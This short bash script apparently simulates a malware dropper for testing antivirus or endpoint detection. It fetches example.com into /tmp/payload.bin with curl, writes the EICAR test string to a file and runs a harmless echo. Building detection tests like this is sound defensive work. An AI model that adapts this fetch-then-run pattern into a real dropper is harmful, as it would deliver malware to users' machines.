#!/bin/bash
echo "[*] Simulating malware dropper"

# Simulate payload download
echo "[*] Downloading payload (simulated)"
curl http://example.com -o /tmp/payload.bin

# EICAR test string (AV trigger)
echo 'X5O!P%@AP[4\PZX54(P^)7CC)7}$EICAR-STANDARD-ANTIVIRUS-TEST-FILE!$H+H*' > /tmp/eicar_test.txt

# Execute something suspicious-looking
bash -c "echo running payload"

echo "[*] Done"

